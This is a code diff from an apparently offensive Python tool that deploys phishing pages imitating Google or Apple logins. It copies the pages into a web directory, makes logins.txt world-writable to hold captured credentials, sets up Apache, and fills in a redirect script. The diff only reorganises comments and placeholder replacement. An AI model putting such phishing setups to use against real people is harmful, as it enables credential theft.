@@ -157,7 +157,7 @@ if __name__ == "__main__":
     Base.print_info("Phishing domain local path: ", se_path)
     # endregion
 
-    # Directory for fishing site
+    # region Directory for phishing domain
     if not path.exists(se_path):
         if args.phishing_domain_path == "google" or args.phishing_domain_path == "apple":
             copytree(src=script_dir + "/Phishing_domains/" + args.phishing_domain_path, dst=se_path)
@@ -166,6 +166,7 @@ if __name__ == "__main__":
             exit(1)
 
     sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)
+    # endregion
 
     # region Apache2 sites settings
     default_site_file_name = "000-default.conf"
@@ -218,7 +219,8 @@ if __name__ == "__main__":
         content = redirect_script.read()
 
     # Replace the string
-    content = content.replace('change_me', se_domain)
+    content = content.replace('se_domain', se_domain)
+    content = content.replace('se_path', se_path)
 
     # Write redirect script
     with open(redirect_script_dst, 'w') as redirect_script:
